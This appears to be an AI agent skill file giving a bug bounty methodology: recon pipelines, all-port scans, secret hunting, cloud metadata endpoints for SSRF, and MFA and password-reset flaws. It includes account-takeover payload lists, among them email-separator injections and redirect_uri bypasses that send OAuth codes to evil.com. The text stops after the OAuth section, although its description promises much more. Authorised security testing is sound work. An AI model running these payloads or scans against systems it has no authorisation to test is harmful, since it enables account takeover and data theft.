---
name: bug-bounty-hunting
description: "Comprehensive bug bounty hunting skill covering the full offensive security testing lifecycle. Includes reconnaissance and discovery (subdomain enumeration, directory brute-forcing, technology fingerprinting, cloud recon), authentication and session management attacks (MFA bypass, password reset flaws, OAuth/SAML/JWT exploitation), authorization and IDOR testing (horizontal/vertical/cross-tenant, function-level access control, GraphQL node queries), injection vulnerabilities (SQLi, command injection, SSTI, LDAP/JNDI), client-side attacks (reflected/stored/blind XSS, CSRF, open redirect, clickjacking), server-side attacks (complete SSRF playbook with cloud metadata escalation, DNS rebinding, redirect chains, file processing pipelines, path traversal, file upload, XXE, CRLF), deserialization and parser bugs (Java, Ruby, PHP, Python, Node.js, HTTP/3, TLS), DoS and resource exhaustion (ReDoS, algorithmic complexity, pixel floods), business logic and race conditions (payment bypass, state machine manipulation, feature gating), infrastructure and cloud (subdomain takeover, cache poisoning, Kubernetes, S3, CI/CD), mobile and desktop (Android exported components, iOS WebView, Electron RCE), GraphQL and API specifics, WAF and filter bypass master list, HTTP smuggling, advanced vulnerability chaining (35 real-world chains), tooling and automation pipelines, testing methodology checklists, and report writing with impact maximization. Use when performing bug bounty hunting, web application penetration testing, security assessments, vulnerability research, or building offensive security testing workflows."
---

# Bug Bounty Hunting — Complete Offensive Testing Methodology

## Quick Workflow

1. **Recon** — Enumerate subdomains, directories, technologies, cloud assets, and exposed services
2. **Map** — Identify all input vectors, endpoints, roles, and trust boundaries
3. **Probe** — Test authentication, authorization, injection, and business logic per endpoint
4. **Exploit** — Chain vulnerabilities for maximum impact (SSRF→metadata→RCE, XSS→ATO, IDOR→data breach)
5. **Escalate** — Walk the escalation ladder; no bug is "low" if it unlocks the next one
6. **Report** — Document with clean PoC, real-world impact, and remediation guidance

---

## 1. CORE PHILOSOPHY & MINDSET

### The Four "Never Trust" Principles

- **Never trust the client** — UI restrictions are meaningless without server-side enforcement
- **Never trust the backend** — even "internal" APIs need auth checks
- **Never trust the parser** — different parsers resolve the same input differently
- **Never trust the cache** — cache and origin may interpret requests differently
- **Never trust the redirect** — always validate destination against allowlist

### The "Everywhere" Principle

- Test **every parameter** — URL, body, headers, cookies, path segments, query strings
- Test **every endpoint** — even "internal," "debug," or "deprecated" ones
- Test **every state** — draft, published, deleted, archived, pending, paused
- Test **every platform** — web, mobile API, desktop client, GraphQL, WebSocket, third-party integrations
- Test **every combination** — single parameter vs. multi-parameter mutation

### The "Edge Case" Principle

- **Default values are dangerous** — test `0000`, empty strings, null, undefined
- **Boundaries are dangerous** — test max values, zero values, negative values, `0x7fffffff`
- **Type confusion is dangerous** — arrays where strings expected, objects where primitives expected
- **Encoding is dangerous** — Unicode, HTML entities, URL encoding, base64, hex, octal
- **Timing is dangerous** — race conditions exist in every concurrent system

### The "Interaction" Principle

- **Features interact** — combining two "safe" features creates vulnerabilities
- **Protocols interact** — HTTP/2 + HTTP/1.1, TLS + session resumption
- **Libraries interact** — different versions of middleware handle input differently
- **Systems interact** — frontend sanitization ≠ backend sanitization

### The Golden Rules (from 2000+ reports)

1. **The API is the product. UI is a suggestion.** Test endpoints, not pages.
2. **Every ID is a question: "do you own this?"** — if the server doesn't ask, you have IDOR.
3. **Every redirect is a weapon:** chain it into OAuth, CSRF, SSRF, phishing.
4. **Every input is code:** filenames, branch names, map names, chat reactions, email subjects, CSV cells, SVG attributes, HTTP headers, TLS options.
5. **Client state is a lie:** cookies, hidden fields, feature flags, `enableAuthorize`, `admin_approval`, `captain`, `status` — all must be re-verified server-side.
6. **Side effects leak:** error messages, response times, HTTP codes, cache state, notification counts, profile metrics — all are oracles.
7. **Old code is new attack surface:** deprecated APIs, legacy subdomains, cached URLs, archived forms, outdated libraries, unmaintained plugins.
8. **Fixes regress and fork:** test the patch against all code paths, all platforms, all input types, forever.
9. **Chain relentlessly:** no bug is "low" if it unlocks the next one.
10. **Read the source when available:** open-source repos, JS bundles, mobile APKs, public GitHub, CI logs — the vulnerability is often documented in the code itself.

### 🧠 The "Understand Before You Attack" Principle (Tip #5)

Don't start by running every tool you know. Spend 15–20 minutes understanding the application first:

- Map the user roles.
- Identify sensitive actions.
- Trace every API request in Burp.
- Ask yourself: "What assumptions is the application making?"

Good recon isn't about collecting hundreds of URLs—it's about understanding how the application actually works. The best bugs usually come from understanding business logic, not from the biggest wordlist.

### 🧠 The "403 Is Not the End" Principle (Tip #4)

Don't stop testing after getting a "403 Forbidden". A 403 often means:

- Another HTTP method might work.
- The API endpoint may behave differently.
- A different user role could access it.
- A related endpoint might be missing the same check.

Sometimes a 403 is the beginning of the bug—not the end.

### 🧠 The "State Transition" Principle (Tip #3)

When testing authenticated features, don't just compare User A vs User B. Also compare:

- New account vs old account
- Verified vs unverified account
- Free vs premium account
- Owner vs manager vs member
- Invited user vs self-registered user
- Suspended vs active account

Many business logic vulnerabilities exist because developers validate who you are but forget what state your account is in. State transitions are where high-impact bugs often hide.

### 🧠 The JavaScript Hacking Philosophy

- **"If it happens on the client, the code is there."** Any function that executes in the browser—signing, encryption, validation—must have all its secrets and logic present in the client-side JavaScript. The signing key, the algorithm, the obfuscated logic are all reachable.
- **Client-side protections are illusory.** Anything the browser can enforce (input filters, debugger blocks, console silencing) can be bypassed because you control the execution environment. There is no security through obscurity in the front end; view every protection as a temporary speed bump.
- **Dynamic analysis and static analysis are complementary, not mutually exclusive.** Use static tools to map the attack surface (endpoints, secrets, dangerous calls). Then zoom in dynamically to understand complex logic, extract keys, or bypass runtime checks.
- **Don't trust the original code surface; transformations are only skin-deep.** Minification and obfuscation make code ugly but don't hide secrets, hardcoded URLs, or calls to `eval`, `innerHTML`, etc. Deobfuscation rarely restores full readability, but it often clears enough clutter to enable dynamic analysis.

### 🧠 The "API-First" Principle (from API Pentesting Blog)

- All dynamic websites are composed of APIs
- Classic web vulns (SQLi, XSS) can be classified as API testing
- Focus on APIs NOT fully exposed through the front-end
- The API is the product; the UI is just one consumer

### 🧠 The "Verb Matters" Principle (from API Pentesting Blog)

- REST: use appropriate HTTP verbs (GET=read, POST=create, etc.)
- Bad: `POST /getuser`, `GET /user/create`
- Good: `GET /users`, `POST /users`, `DELETE /users/<id>`
- Test ALL verbs on every endpoint (OPTIONS reveals supported methods)

### 🧠 The "Overfetching = Data Leak" Principle (from API Pentesting Blog)

- REST sends everything → excessive data exposure
- GraphQL solves this → but misconfigured schemas still leak
- Check if responses contain fields beyond what the UI displays

### 🧠 The "Single Endpoint" Principle — GraphQL (from API Pentesting Blog)

- GraphQL uses ONE endpoint for ALL operations
- Operation type + name determine handling, not URL or HTTP method
- This means: one endpoint = entire attack surface

### 🧠 The "Zombie API" Principle (from API Pentesting Blog)

- Old/retired endpoints often still exist
- They lack modern security controls
- Wayback Machine + documentation comparison = zombie discovery
- OWASP API9: Improper Inventory Management

### 🧠 The "Trust No Third-Party API" Principle — API10 (from API Pentesting Blog)

- Developers blindly trust data from reputable third-party APIs
- Relaxed validation on inter-API data → injection, RCE
- Test: what happens if a partner API returns malicious data?

### 🧠 The "A-B-A" Principle — BFLA Testing (from API Pentesting Blog)

- Don't just swap tokens (A→B)
- Verify impact: A→B→A (confirm the action actually took effect)
- Strong proof of concept requires demonstrating the change persisted

### 🧠 The "Content-Type is a Weapon" Principle (from API Pentesting Blog)

- Changing Content-Type can:
  - Trigger verbose errors (info disclosure)
  - Bypass flawed defenses (JSON secure, XML vulnerable)
  - Enable XSS via misconfiguration
  - Avoid CORS preflight (text/plain)
- Always test: application/json, application/xml, text/plain, form-urlencoded

---

## 2. RECONNAISSANCE & DISCOVERY

### Subdomain Enumeration

```bash
# Tools
Subfinder, Amass, Sublist3r, crt.sh, Censys, SecurityTrails

# High-value subdomain patterns
dev, staging, test, admin, api, old, legacy, partner, vendor, internal
game marketing sites, old Swagger UIs, deprecated APIs

# Dangling CNAME targets (subdomain takeover)
*.mktoweb.com (Marketo)      *.fastly.net (Fastly)
*.cloudfront.net (AWS)       *.herokuapp.com (Heroku)
*.github.io (GitHub Pages)   *.wordpress.com (WordPress)
*.squarespace.com            *.wix.com
*.feedpress.me               *.uservoice.com
*.uptimerobot.com            *.uberflip.com
*.amazonaws.com (S3)         *.azurewebsites.net

# Critical checks
- CNAME pointing to unclaimed third-party service = instant takeover
- Stale DNS records after decommissioning = takeover waiting to happen
- Check CAA records (may prevent SSL cert for PoC)
- NS records pointing to deleted Route 53 zones = full DNS control
```

### 🔄 One-Command Endpoint Discovery (Tip #1)

```bash
# One command. Thousands of endpoints.
echo http://target.com | katana -silent | gau | uro | grep "=" | sort -u

# What it does:
# "katana"       → Crawls the target (active spider)
# "gau"          → Pulls historical URLs (Wayback, CommonCrawl, OTX)
# "uro"          → Removes duplicate/noisy URLs
# grep "="       → Keeps only parameterized URLs (great for XSS, SQLi, IDOR, SSRF)
# "sort -u"      → Deduplicates the final output

# Extended variant with more sources:
echo http://target.com | waybackurls | gau | katana -silent | uro | \
  grep -E "\?(.*=|.*%3d)" | sort -u > params.txt

# Filter by vulnerability type:
grep -iE "(url=|redirect=|next=|dest=|redir=|uri=|path=|continue=)" params.txt  # SSRF/Redirect
grep -iE "(id=|user=|account=|number=|order=|no=|doc=|key=|email=)" params.txt  # IDOR
grep -iE "(q=|s=|search=|query=|term=|keyword=)" params.txt                     # XSS
grep -iE "(file=|path=|folder=|dir=|page=|template=|include=)" params.txt       # LFI/SSTI
```

### Directory & File Discovery

```bash
# Credential/Config leaks
/.env                    # AWS, DB, SendGrid, Redis credentials
/.git/                   # Source code, secrets, commit history
/.git/logs/refs/heads/master
/.DS_Store               # Internal directory structure, license keys
/database.php.orig       # Backup files with DB credentials
/.php.orig, /.bak, /~    # Editor backup files
/wp-admin/setup-config.php  # WordPress takeover (use free MySQL hosting)
/xmlrpc.php              # DDoS amplification, brute force, user enum
/wp-cron.php
/info.php, /phpinfo.php  # System config, cookies echoed back
/crossdomain.xml         # Flash cross-origin policy
/.well-known/            # security.txt, openid-configuration
/robots.txt, /sitemap.xml

# Debug/Admin paths
/debug/, /test/, /dev/, /admin/, /swagger/, /api-docs/
/classicapi/doc/         # Old Swagger UI (configUrl XSS)
/WEB-INF/, /META-INF/    # Java class files (decompile)
/keys/, /examples/       # Tomcat examples → version → CVEs
/elmah.axd               # .NET error logging (full request leak)
/actuator/               # Spring Boot (env, heapdump, trace)
/eureka/                 # Netflix Eureka service registry
```

### 🔍 Alternate Port Scanning (Tip #46)

```bash
# Most beginners scan only 80 and 443. Professionals don't.
# Modern infrastructures expose web services across multiple alternate ports:
3000   → Dev servers (React, Node, Rails)
8080   → App servers (Tomcat, Jenkins, proxies)
9200   → Elasticsearch
5601   → Kibana
8443   → Alt HTTPS (admin panels, APIs)
9000   → Admin dashboards (SonarQube, Portainer)
8888   → Jupyter notebooks
4443   → Alt HTTPS (internal)
8081   → Nexus, secondary app servers
9090   → Prometheus
3001   → Secondary dev servers
5000   → Flask, Docker registry
4200   → Angular dev server
8000   → Django, FastAPI
15672  → RabbitMQ management
2375   → Docker API (unencrypted)
2376   → Docker API (TLS)
6379   → Redis
11211  → Memcached
27017  → MongoDB
5432   → PostgreSQL
3306   → MySQL

# httpx professional workflow:
cat subdomains.txt | httpx -silent -ports 80,443,3000,8080,8443,9000,9200,5601,8888 -status-code -title -tech-detect

# Full coverage scan:
cat subdomains.txt | httpx -silent -ports 1-65535 -threads 200 -status-code | grep -E "200|301|302|403"

# Recon is not about tools. It's about coverage + precision.
```

### 🔍 Investigating 401 Unauthorized Pages (Tip #59)

```bash
# Many bug hunters ignore blank 401 Unauthorized pages.
# If you ever land on a 401 Unauthorized page, ALWAYS check the response body:
# - You might find debug information
# - Internal paths or stack traces
# - API documentation links
# - Version information
# - Hints about authentication mechanism

# Also test:
- Different HTTP methods (OPTIONS may reveal allowed methods)
- Adding common auth headers with dummy values
- Accessing with trailing slash or different paths
- Checking if WWW-Authenticate header reveals auth type
- Trying HTTP/1.0 vs HTTP/1.1
- Testing with different Accept headers
```

### 🔍 Unauthenticated Security Dashboards (Tip #65)

```bash
# Deep recon (subdomain enumeration, JS analysis, URL fuzzing) often reveals
# unauthenticated admin/security dashboards.
# Common paths to check:
/grafana/           /prometheus/        /kibana/
/jenkins/           /argocd/            /portainer/
/rancher/           /consul/            /vault/
/nexus/             /sonarqube/         /phpmyadmin/
/adminer/           /swagger-ui/        /api-docs/
/health/            /metrics/           /debug/
/status/            /server-status/     /server-info/

# Philosophy: Exhaustive recon pays off. Misconfigurations often yield
# high impact without needing complex exploitation.
```

### Technology Fingerprinting

```bash
# Version-Specific Targets
Jetty 9.2.x              → Jetleak (shared buffer leak)
Apache Tomcat 8.5.33     → 11 known CVEs including RCE
Django DEBUG=True        → Full system config leak via /admin POST
Grafana < 8.3.0          → CVE-2022-21703 (CSRF to org admin)
WordPress plugins        → wpscan for known CVEs
Elasticsearch            → Painless script injection via sort_query
Salesforce Aura API      → Object-level permission bypass
Phabricator              → Padding oracle, debug endpoints, VCS abuse
Swagger UI (outdated)    → configUrl XSS, DOMPurify bypass
AngularJS (legacy)       → Sandbox escape → stored XSS
TinyMCE 2.4.0            → Drag-and-drop XSS via redirect

# Header Analysis
Server banners           → Version mapping to CVEs
BIGipServer* cookies     → Decode internal IP:port (decimal→hex→dotted)
X-Frame-Options, CSP     → Clickjacking/XSS feasibility
CORS headers             → Misconfiguration exploitation
Set-Cookie + Cache-Control: public → Session leak via cache
x-sendfile header        → Internal filesystem path disclosure
```

### 📜 JavaScript Reconnaissance (Tip #8 + JS Hacking Strategies)

```bash
# Don't just search for API keys. Search for:
fetch(
axios(
graphql
Authorization
Bearer
TODO
internal
staging
admin
password
token
secret
api_key
debug
config

# Modern bug bounty starts with understanding client-side logic.

# === STATIC ANALYSIS STRATEGIES ===

# 1. Bulk download JavaScript with Burp + wget
# Filter HTTP history by *.js, copy all URLs, save to urls.txt:
wget -i urls.txt -P js/

# 2. Extract hidden endpoints with LinkFinder
python linkfinder.py -i 'js/*' -o cli | sort -u | grep <pattern>

# 3. Find secrets with TruffleHog on a local directory
trufflehog filesystem ~/Downloads/js --no-verification --include-detectors="all"

# 4. Greppable keywords for manual review:
# password, admin, login, token, user, auth, key, secret, api_key

# 5. Find dangerous JavaScript patterns with Semgrep
semgrep scan --config auto ./js/
# Review hits for: innerHTML, eval, postMessage, document.write, etc.

# 6. Detect outdated libraries
# Inspect file names (e.g., jquery-2.2.4.min.js) or version strings.
# Cross-check with Snyk's vulnerability database. Use Retire.js in Burp.
# NOTE: Always verify exploitability—the library may be present but vulnerable function unused.

# === DYNAMIC ANALYSIS STRATEGIES ===

# 1. Set event listener breakpoints
# Right-click a button → Inspect → Event Listeners tab → click handler → Sources tab

# 2. Use XHR/fetch breakpoints to intercept data before it's sent
# Sources tab → XHR/fetch Breakpoints → add URL pattern
# Execution pauses right before the network request, with all variables computed.

# 3. Step through code and modify variables in-flight
# Set breakpoint → Step over (F9) → Double-click variable in Scope pane → Edit value
# This bypasses client-side filters without touching the source.

# 4. Reconstruct function calls from obfuscated code
# During debugging, scope shows resolved values of packed array indexes.
# Note strings as returned: JWS, sign, HS256, the hex key.
# Piece together: KJUR.jws.JWS.sign("HS256", header, payload, "hexkey")

# 5. Extract and reuse signing keys for Burp extensions
echo "646562..." | xxd -r -p | base64
# Load base64 key into JWT Editor as symmetric key.

# === OBFUSCATION BYPASS TECHNIQUES ===

# Always beautify first:
# Chromium's built-in pretty-print, js-beautify, or online tools

# Source maps are gold:
# If //# sourceMappingURL=... exists, load the .map file

# Self-Defending (breaks on beautify):
# Symptom: infinite recursion after prettifying
# Bypass: Look for regex (((.+)+)+)+$ → comment out its caller
sed -i 's/(((.+)+)+)+\$//g' file.js

# Debug Protection (infinite debugger loops):
# Use Call Stack pane → step out to nearest removable call
# Delete the else block or function call that triggers the loop

# Disabled Console Output bypasses:
# Method 1: Use an iframe's console
#   var iframe = document.createElement('iframe');
#   document.body.appendChild(iframe);
#   console = iframe.contentWindow.console;
# Method 2: Remove the array of method names ["log","warn","info","error",...]
# Method 3: Remove "console" from the packed string array

# General advice:
# - Test in multiple browsers; Firefox gives better error messages
# - Identify the obfuscator by testing minimal code with its online demo
# - Every client-side protection can be removed because you control the runtime

# === MAKE BYPASSES PERSISTENT ===
# Use Chromium's Local Overrides or Burp's HTTP Mock extension
# to keep JavaScript modifications across navigations.
```

### 🔑 Hidden Parameter Discovery (Tips File - Hidden Parameters Section)

```bash
# Hidden parameters are high-value targets because developers often rely on
# obscurity instead of proper validation, leaving them vulnerable to
# SQLi, XSS, IDOR, and command injection.
# They typically arise from:
# - Debug leftovers
# - Admin/internal tracking functions
# - Legacy API endpoints

# === 5 METHODS TO DISCOVER HIDDEN PARAMETERS ===

# 1. HTML Input Fields
# Scrape id and name attributes of ALL HTML elements (including hidden fields)
# Tools: GoSpider, GAP (Burp extension), manual Burp inspection

# 2. JavaScript File Enumeration
# Inspect JS files for function calls that parse parameters and API references
# Collect variable names and test them as parameters
# Use client-side interceptors like Eval Villain for DOM-based processing

# 3. Google/GitHub/Wayback Machine Enumeration
# Google dorks: site:example.com inurl:?
# Wayback Machine: discover legacy parameters in archived page versions
# GitHub: search for target domain in public repos

# 4. Parameter Fuzzing
# Actively brute-force parameters by observing backend response changes
# Tools: Ffuf, Arjun (Python), x8 (Rust), ParamMiner (Burp plugin)
# Combine generic wordlists with custom ones tailored to target's framework

# 5. Re-using Parameters
# Export crawled parameters from proxies (Burp/ZAProxy)
# Test them against DIFFERENT endpoints
# Check mobile application source code for web links containing parameters

# Key Tools:
# Arjun    → Python-based parameter discovery
# x8       → Rust-based, fast parameter fuzzing
# ParamMiner → Burp plugin for hidden parameter mining
# GAP      → Burp extension for parameter collection
```

### Cloud & Infrastructure Recon

```bash
# S3 Buckets
- Check public listing: https://s3.amazonaws.com/bucket-name
- Check public read/write ACLs (test AWS CLI vs browser)
- Signed URL path manipulation: /.? to comment out suffix → bucket root

# Exposed Services (Port Scanning)
MQTT (1883)       → Subscribe "#" for all messages (license keys, emails)
Elasticsearch (9200) → No auth = data dump
Redis (6379)      → No auth = cache poisoning, Resque job RCE
Zookeeper (2181)  → No auth = admin commands (dump, envi, stat, kill)
Docker API (2375) → Full container management
JMX (555, 1099)   → RCE via deserialization
cAdvisor (8080)   → Container metrics exposed
Splunk (8089)     → Default creds admin:changeme
Presto/Trino      → BigData database access
SMTP (587)        → Open relay, phishing, log-poisoning RCE
MCP Server (9876) → DNS rebinding → internal SSRF
Jolokia (6725)    → JMX HTTP bridge → jvmtiAgentLoad → RCE

# Metadata Endpoints (SSRF Targets)
AWS:     http://169.254.169.254/latest/meta-data/iam/security-credentials/
GCP:     http://metadata.google.internal/computeMetadata/v1/
         Header: Metadata-Flavor: Google
         NOTE: /v1beta1/ does NOT require the header!
Alibaba: http://100.100.100.200
Azure:   http://169.254.169.254/metadata/instance?api-version=2017-08-01
         Header: Metadata: true

# CI/CD & Code Leaks
- Travis/TeamCity logs: search for "auth:", "Bearer", "token", "password"
- Public GitHub: hardcoded keys in Constants.kt, Steps.py, .env
- Gists: internal dashboards with employee emails
- Open-source repos: commit history with internal PATs
- LeakIX (leakix.net): exposed .env files at scale
- Shodan/Censys: exposed services, certificate transparency
- Wayback Machine: old UUIDs, form URLs, deprecated endpoints
- Google dorks: site:target inurl:email=, inurl:admin, filetype:env
```

### 🔍 API-Specific Reconnaissance (from API Pentesting Blog)

```bash
# API Endpoint Discovery Patterns
# URL naming schemes:
https://target-name.com/api/v1
https://api.target-name.com/v1
https://target-name.com/docs
https://dev.target-name.com/rest

# Directory indicators:
/api, /api/v1, /v1, /v2, /v3, /rest
/swagger, /swagger.json, /swagger/index.html
/openapi.json, /doc, /docs
/graphql, /graphiql, /altair, /playground

# Subdomain indicators:
api.target-name.com
uat.target-name.com
dev.target-name.com
developer.target-name.com
test.target-name.com

# HTTP response indicators:
Content-Type: application/json
Content-Type: application/xml
{"message": "Missing Authorization token"}

# Types of APIs by Access Level:
# Public APIs   → easily found, may require auth, public docs available
# Partner APIs  → harder to find, limited docs, partner-only
# Private APIs  → internal use, sparse/no docs, reverse-engineering needed

# Third-Party API Discovery Sources:
- GitHub: https://github.com/
- Postman Explore: https://www.postman.com/explore/apis
- APIs Guru: https://apis.guru/
- Public APIs GitHub: https://github.com/public-apis/public-apis
- RapidAPI Hub: https://rapidapi.com/search/

# Google Dorking for APIs:
inurl:"/wp-json/wp/v2/users"                    # WordPress API user dirs
intitle:"index.of" intext:"api.txt"             # API key files
inurl:"/api/v1" intext:"index of /"             # API directories
ext:php inurl:"api.php?action="                 # XenAPI SQLi
intitle:"index of" api_key OR "api key" OR apiKey -pool  # Exposed keys

# GitDorking for API Secrets:
filename:swagger.json
extension:.json
# Search org name + "api key", "apikey", "authorization: Bearer",
# "access_token", "secret", "token"
# Check Code, Issues, and Pull Requests tabs

# TruffleHog for GitHub org scanning:
sudo docker run -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --org=target-name
# Also supports: Git, GitLab, Amazon S3, filesystems, Syslog

# Shodan for API Discovery:
hostname:"targetname.com"                       # Basic domain search
"content-type: application/json"                # JSON-responding services
"content-type: application/xml"                 # XML-responding services
"200 OK"                                        # Successful responses
"wp-json"                                       # WordPress API

# Wayback Machine for Zombie APIs:
# Compare historical documentation snapshots
# Find retired endpoints that still exist (OWASP: Improper Assets Management)
# Always test old/retired endpoints during active testing

# Discovering Undocumented API Documentation:
/api
/swagger/index.html
/openapi.json
# If you find /api/swagger/v1/users/123, investigate base paths:
/api/swagger/v1
/api/swagger
/api
# Use Burp Intruder with common paths list

# Using Machine-Readable Documentation:
# Use Burp Scanner to crawl and audit OpenAPI documentation (JSON or YAML)
# Use OpenAPI Parser BApp
# Use Postman or SoapUI for documented endpoints
# Check JavaScript files for endpoint references (JS Link Finder BApp)
# Test ALL HTTP methods on each endpoint (Burp Intruder HTTP verbs list)

# Identifying Supported Content Types:
# Change Content-Type to trigger errors, bypass defenses, exploit parsing diffs
# JSON → XML may reveal XXE where JSON injection was blocked
# Content-Type misconfiguration can also enable XSS
# Tool: Content Type Converter BApp (Burp)
# MORE: https://l1nuxkid.gitbook.io/l1nuxkid-docs/ctftime.org-writeups/xss-in-api-via-content-type-misconfiguration

# Reverse Engineering an API (No Documentation):
# Method 1: Manual Collection via Postman
# Method 2: Automatic via mitmproxy2swagger:
mitmweb                    # proxy on port 8080, view on 8081
# Browse target app → capture traffic → save flows file
sudo mitmproxy2swagger -i /Downloads/flows -o spec.yml -p http://target.com -f flow
# View result at editor.swagger.io

# Finding Unused/Hidden API Endpoints:
# Given: GET /api/products/1/price
# Try:   OPTIONS /api/products/1/price
# Check: Allow: GET, PATCH  ← reveals hidden methods
# Then:  PATCH /api/products/1/price {"price": 0}

# Finding Hidden Parameters (API-specific):
# Burp Intruder: wordlist of common parameter names
# Param Miner BApp: guesses up to 65,536 parameter names per request
# Right-click request → Extensions → Param Miner → Guess params → Guess JSON parameter
# Check: Extender → Extensions → Param Miner → Output tab
# Insert discovered params back into request and fuzz

# Fuzzing APIs:
# Fuzz ALL potential inputs: headers, query params, POST/PUT body
# Payloads: symbols, numbers, system commands, SQL/NoSQL, emojis, hex, booleans
# Goal: find input API isn't programmed to handle
# Search responses for: verbose errors, processing delays, internal errors
# Subtle signs: slightly longer processing time = payload interpreted

# Endpoint fuzzing with ffuf:
ffuf -X POST \
  -u http://10.1.40.144:3000/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -H "Cookie: user=pentester" \
  -H "Content-Type: application/json" \
  -d '{"test":"data"}'

# Common API Endpoints to Check:
api/v1/docs
api/v1/openapi.json
# MORE: https://gist.github.com/yassineaboukir/8e12adefbd505ef704674ad6ad48743d

# Discovering Injection Vulnerabilities via Fuzzing:
# When API expects certain input type (number, string, boolean), try:
# - A very large number
# - A very large string
# - A negative number
# - A string instead of a number/boolean
# - Random characters
# - Boolean values
# - Meta characters
# If verbose error or delayed response → injection vulnerability trail
```

---

## 3. AUTHENTICATION & SESSION MANAGEMENT

### Session Management Flaws

```bash
# Session Fixation / Persistence
- Password reset doesn't invalidate existing sessions
- Enabling 2FA doesn't invalidate other sessions
- Disconnecting OAuth provider doesn't revoke sessions created through it
- Logout doesn't destroy server-side session (back-button cache)
- Share password change doesn't invalidate previous authentications
- remember_user_token retains same value across logout/re-login
- Push notification subscriptions persist after logout (DM leak)
- Account deactivation doesn't revoke notification subscriptions

# Session Token Issues
- Tokens valid indefinitely (no expiration) — Sign in with Apple JWTs
- Tokens not bound to session/device
- Tokens leaked in error responses (OIDC state in debug JSON)
- Tokens exposed in URL parameters → Referer leakage
- Tokens stored in localStorage without httpOnly
- OAuth authorization codes valid indefinitely (violates RFC 6749)
- Passwordless login tokens survive app revocation
```

### Multi-Factor Authentication Bypass

```bash
# Common Bypasses
- Default OTP values: 0000, 1234, 1111 accepted
- No rate limiting on OTP verification (web OR mobile)
- OTP not invalidated after use
- Brute-force via concurrent requests (race condition)
- 2FA only enforced on web, not mobile API (Slack iOS pin)
- 2FA bypass via alternate login endpoints (TikTok UK Seller URL)
- Change phone number → enter 0000 → accepted (inDrive)
- Session resurrection after password change (VK)
- IP change doesn't re-prompt for 2FA
- Enabling Google Apps silently disables 2FA (Shopify)
- Mode parameter swap: "mode":"email","secureLogin":false
- Airplane mode bypasses client-side lock (Worldcoin)
- WARP Lock bypass: disable from device settings / trusted-ssid / airplane

# Testing Strategy
- Test ALL login entry points (web, mobile, API, OAuth, SSO)
- Test with airplane mode (client-side enforcement bypass)
- Test session behavior across device/IP changes
- Test OTP with sequential values, common patterns
- Test 2FA re-enrollment without current password
```

### Password Reset Vulnerabilities

```bash
# Critical Patterns
- Reset token sent to multiple emails (JSON array injection)
- Reset token valid after expiry (__VIEWSTATE reuse)
- Reset token not bound to user account (mass ATO)
- Reset token brute-forceable (no rate limiting on final step)
- Reset link sent over HTTP (MITM interceptable)
- Reset token logged in daemon logs on mail failure
- Reset token guessable (sequential, timestamp-based)
- Password reset doesn't require current password
- Password reset doesn't invalidate existing sessions
- No notification email on password change via reset flow

# Advanced Techniques
- Content-Type switching: JSON array smuggling
  {"user":{"email":["victim@gmail.com","attacker@gmail.com"]}}
- Parameter pollution: user[email][]=victim&user[email][]=attacker
- Race condition: Request reset → intercept → modify response
- Token manipulation: change single digit in expired token
- Google dorking: site:target inurl:token for leaked reset links
- Email scanner bots auto-click verification links (Proofpoint, Mimecast)
```

### 🔓 Password Reset Token Leak via Referer (Tip #24)

```bash
# POC:
# 1. Requested password reset link
# 2. Reset token appeared in URL parameters
# 3. User visited a third-party page afterward
# 4. Token leaked via the Referer header

# Learning:
# - Never expose sensitive tokens in URLs
# - Use short-lived, one-time reset tokens
# - Always test: does the reset link contain the token in the query string?
# - If yes, check if the page loads any external resources (images, scripts)
# - Check if clicking any link on the reset page leaks the token via Referer

# Additional tests:
# - Does the token appear in browser history?
# - Does the token appear in server access logs?
# - Is the token single-use?
# - What is the token expiration?
# - Can the token be brute-forced (short length, predictable)?
```

### 🔓 Account Takeover via Email Separators (Tip #50)

```bash
# Yet another Account Takeover technique:

# Separator-based:
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
email=victim@mail.com;hacker@mail.com
email=victim@mail.com%00hacker@mail.com

# Array-based:
{"email":["victim@mail.com","hacker@mail.com"]}
email[]=victim@mail.com&email[]=hacker@mail.com

# Test on:
# - Registration endpoints
# - Password reset endpoints
# - Invitation endpoints
# - Newsletter/subscription endpoints
# - Any endpoint that sends email based on user input

# The goal: password reset email sent to BOTH victim and attacker
```

### OAuth & SSO Vulnerabilities

```bash
# OAuth Specific
- Authorization codes valid indefinitely (violates RFC 6749)
- Missing PKCE in mobile apps → deep link hijacking (shopapp://)
- redirect_uri not validated → code theft
- redirect_uri path traversal: /callback/../../../../attacker
- redirect_uri accepts javascript: protocol → XSS
- State parameter not validated → CSRF
- State parameter leaked in error response (OIDC debug leftover)
- State parameter static/fixated → CSRF login
- Token interception via open redirect in RelayState
- Implicit grant (response_type=token) → token in URL fragment
- Client secret stored plaintext in database
- Scope manipulation triggers auto-redirect without consent
- Invalid scope → redirect to attacker redirect_uri
- OAuth code interception via Referer leakage to external content

# SAML Specific
- RelayState open redirect → token theft
- SAML response not verified → auth bypass
- GET-based SAML auto-login → Login CSRF
- XML signature stripping
- Comment injection in SAML assertions

# JWT Specific
- Algorithm confusion (alg: none)
- Weak secrets (crackable via john/hashcat)
- Missing signature verification (user_oidc)
- Excessive lifetime (no revocation) — Sign in with Apple
- Token not invalidated on provider disconnect
```

### 🔓 OAuth Misconfiguration → Account Takeover (Tips #36, #47, #69)

```bash
# POC (Tip #36):
# 1. Tested OAuth login flow
# 2. Modified `redirect_uri` to attacker domain
# 3. OAuth token was sent to malicious endpoint
# 4. Logged into victim account using stolen token

# POC (Tip #47 - Detailed):
# 1. While testing OAuth login, observed redirect_uri was weakly validated
# 2. Modified redirect_uri to an attacker-controlled domain
# 3. Application accepted the manipulated redirect URL
# 4. Authorization code was sent to the attacker's server
# 5. Exchanged the code for an access token
# 6. Used the token to log in as the victim (Account Takeover)

# redirect_uri Bypass Payloads (Tip #69):
redirect_uri=https://evil.com
redirect_uri=https://victim.com/../../evil.com
redirect_uri=https://victim.com%00@evil.com
redirect_uri=https://victim.com@evil.com
redirect_uri=https://victim.com.evil.com
redirect_uri=https://evil.com#.victim.com
redirect_uri=https://evil.com%23.victim.com
redirect_uri=https://victim.com//evil.com
redirect_uri=https://victim.com/redirect?url=https://evil.com

# Learning:
# - OAuth flows are high-value targets for attackers
# - redirect_uri must be strictly allow-listed (exact match, no wildcards)
# - Small OAuth misconfigs often lead directly to ATO
